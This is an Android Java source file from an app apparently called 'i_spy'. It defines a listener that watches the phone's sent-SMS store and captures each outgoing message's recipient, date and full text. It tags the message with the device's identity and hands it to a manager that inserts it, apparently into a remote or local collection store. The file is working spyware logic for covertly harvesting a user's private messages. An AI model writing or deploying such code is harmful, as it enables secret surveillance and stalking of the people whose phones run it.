package com.um.asn.i_spy.listeners;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

import com.um.asn.i_spy.managers.MessageManager;
import com.um.asn.i_spy.models.Message;
import com.um.asn.i_spy.models.Phone;

import java.util.ArrayList;

public class MessageSendListner extends ContentObserver {

    private Context context;
    private String lastSmsId;

    public MessageSendListner(Handler handler, Context context) {
        super(handler);
        this.context = context;
    }

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);

        Uri uriSMSURI = Uri.parse("content://sms/sent");
        Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
        cur.moveToNext();

        if (!cur.isAfterLast()) {
            String id = cur.getString(cur.getColumnIndex("_id"));
            int type = cur.getInt(cur.getColumnIndex("type"));

            if (type == Message.TYPE_SENT && smsChecker(id)) {
                System.out.println("Message envoye");
                System.out.println("Contenu : " + cur.getString(cur.getColumnIndex("body")));

                Phone phone = new Phone();
                phone.loadWithFile(context);

                Message message = new Message(
                        cur.getString(cur.getColumnIndex("address")),
                        cur.getInt(cur.getColumnIndex("type")),
                        cur.getInt(cur.getColumnIndex("date")),
                        cur.getString(cur.getColumnIndex("body")),
                        phone
                );
                ArrayList<Message> messages = new ArrayList<Message>();
                messages.add(message);

                System.out.println(message.getNumero() + " / " + message.getType() + " / " + message.getDate() + " / " + message.getContenu());

                MessageManager messageManager = new MessageManager(this.context, phone);
                messageManager.setMessages(messages);
                if (!messageManager.insert())
                    messageManager.insertLocal();
            }
        }
    }

    public boolean smsChecker(String smsId) {
        boolean flagSMS = true;

        if (smsId.equals(lastSmsId)) {
            flagSMS = false;
        } else {
            lastSmsId = smsId;
        }

        return flagSMS;
    }
}
